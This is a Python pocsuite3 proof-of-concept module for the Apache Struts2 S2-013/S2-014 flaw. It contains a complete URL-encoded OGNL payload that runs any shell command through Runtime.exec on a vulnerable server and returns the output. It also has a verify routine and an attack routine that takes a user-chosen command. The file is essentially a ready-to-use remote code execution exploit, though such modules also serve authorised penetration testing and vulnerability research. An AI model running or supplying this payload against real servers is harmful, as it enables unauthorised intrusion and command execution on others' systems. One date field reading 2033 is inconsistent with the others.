from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.enums import VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2033-11-15'
    createDate = '2023-11-15'
    updateDate = '2023-11-15'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-013']
    name = 'Apache Struts2 s2-013'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = 'Struts 2.0.0 - Struts 2.3.14.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dockerfile = '''FROM isxiangyang/struts2-all-vul-pocsuite:latest'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('ls', description="可执行的shell命令")
        return o

    def _verify(self):
        p = self._check()
        if p:
            return self.parse_output(p)

    def _check(self):
        result = {}
        hash_str = random_str(10)
        command = [
            "echo " + hash_str,
            "cmd.exe /c echo " + hash_str
        ]
        for cmd in command:
            html = self.exp(cmd)

            if hash_str in html:
                result["VerifyInfo"] = {
                    "URL": self.url,
                }

                return result
        return False

    def exp(self, command):
        exec_payload = "%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D"
        payload = exec_payload.format(cmd=quote(command))
        html = requests.get(self.url + "?x={payload}".format(payload=payload)).text
        return html

    def _attack(self):
        result = {}
        p = self._check()
        if p:
            command = self.get_option("command")
            html = self.exp(command)
            result["VerifyInfo"] = {
                "URL": self.url,
                "HTML": html.replace("\x00", "").encode()
            }

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
